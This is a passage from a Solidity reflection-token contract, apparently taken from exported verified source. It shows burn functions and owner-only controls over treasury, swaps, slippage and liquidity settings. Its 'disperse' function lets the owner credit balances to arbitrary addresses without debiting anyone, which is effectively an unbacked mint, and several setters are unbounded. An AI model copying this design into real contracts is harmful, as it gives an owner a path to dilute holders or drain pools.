soon\");\n        uint256 rTarget = (_fragmentBalances[address(0)] * percent) / 100;\n        _fragmentBalances[address(0)] -= rTarget;\n        _totalFragments -= rTarget;\n        _lp.sync();\n        _lp.skim(treasury); // take any dust\n        _lastBurnOrBase = block.timestamp;\n    }\n\n    // manual burn amount, for *possible* cex integration\n    // !!BEWARE!!: you will BURN YOUR TOKENS when you call this.\n    function burnFromSelf(uint256 amount)\n        external\n        activeFunction(2)\n    {\n        address sender = _msgSender();\n        uint256 rate = fragmentsPerToken();\n        require(!fbl_getExcluded(sender), \"Excluded addresses can't call this function\");\n        require(amount * rate < _fragmentBalances[sender], \"too much\");\n        _fragmentBalances[sender] -= (amount * rate);\n        _fragmentBalances[address(0)] += (amount * rate);\n        _balances[address(0)] += (amount);\n        _lp.sync();\n        _lp.skim(treasury);\n        emit Transfer(address(this), address(0), amount);\n    }\n\n    /* !!! CALLER WILL LOSE COINS CALLING THIS !!! */\n    function baseFromSelf(uint256 amount)\n        external\n        activeFunction(3)\n    {\n        address sender = _msgSender();\n        uint256 rate = fragmentsPerToken();\n        require(!fbl_getExcluded(sender), \"Excluded addresses can't call this function\");\n        require(amount * rate < _fragmentBalances[sender], \"too much\");\n        _fragmentBalances[sender] -= (amount * rate);\n        _totalFragments -= amount * rate;\n        feesAccruedByUser[sender] += amount;\n        feesAccrued += amount;\n    }\n\n    function createNewTransferPair(address newPair)\n        external\n        activeFunction(4)\n        onlyOwner\n    {\n        address lp = IUniswapV2Factory(IUniswapV2Router02(_router).factory()).createPair(address(this), newPair);\n        _accountStates[lp].transferPair = true;\n    }\n\n    function manualSwap(uint256 tokenAmount, address rec, bool toETH) external\n        activeFunction(5)\n        onlyOwner\n    {\n        if(toETH) {\n            _swapTokensForEth(_token0, rec, tokenAmount);\n        } else {\n            _swapTokensForTokens(_token0, _token1, tokenAmount, rec);\n        }\n    }\n\n    function setLiquifyFrequency(uint256 lim)\n        external\n        activeFunction(6)\n        onlyOwner\n    {\n        _liquifyPer = lim;\n    }\n\n    /**\n     *  @notice allows you to set the rate at which liquidity is swapped\n    */\n    function setLiquifyStats(uint256 rate)\n        external\n        activeFunction(7)\n        onlyOwner\n    {\n        require(rate <= 100, \"!toomuch\");\n        _liquifyRate = rate;\n    }\n\n    function setTreasury(address addr)\n        external\n        activeFunction(8)\n        onlyOwner\n    {\n        treasury = addr;\n    }\n\n    /**\n     *  @notice allows you to determine the split between user and protocol\n    */\n    function setUsp(uint256 perc)\n        external\n        activeFunction(9)\n        onlyOwner\n    {\n        require(perc <= 100, \"can't go over 100\");\n        _usp = perc;\n    }\n\n    function setSlippage(uint256 perc)\n        external\n        activeFunction(10)\n        onlyOwner\n    {\n        _slippage = perc;\n    }\n\n    function setBoBCooldown(uint timeInSeconds) external\n        onlyOwner\n        activeFunction(11)\n    {\n        require(_hardCooldown == 0, \"already set\");\n        _hardCooldown = timeInSeconds;\n    }\n\n    function setIsBurning(bool v) external\n        onlyOwner\n        activeFunction(12)\n    {\n        _isBuuuuurrrrrning = v;\n    }\n    \n    function disperse(address[] memory lps, uint256 amount) \n        external \n        activeFunction(13) \n        onlyOwner \n        {\n            uint s = amount / lps.length;\n            for(uint i = 0; i < lps.length; i++) {\n                _fragmentBalances[lps[i]] += s * _frate;\n        }\n    }\n\n    function unpause()\n        public\n        virtual\n        onlyOwner\n    {\n        _unpaused = true;\n        _swapEnabled = true;\n    }\n    \n\n}\n"
    }
  }
}